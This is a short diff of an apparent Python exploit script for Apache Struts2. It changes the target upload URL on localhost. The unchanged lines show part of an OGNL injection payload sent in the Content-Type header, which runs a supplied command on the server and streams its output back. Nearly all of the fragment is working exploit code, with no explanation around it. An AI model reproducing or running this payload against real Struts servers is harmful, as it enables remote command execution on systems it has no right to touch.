@@ -23,7 +23,7 @@ content_type = ("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_ME
                     "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                     "(#ros.flush())}" %cmd)
 
-url = 'http://localhost:8080/struts2-showcase/fileupload/upload.action'
+url = 'http://localhost:8080/str/fileupload/upload.action'
 
 r = urllib2.Request(url)
 r.addheaders = headers
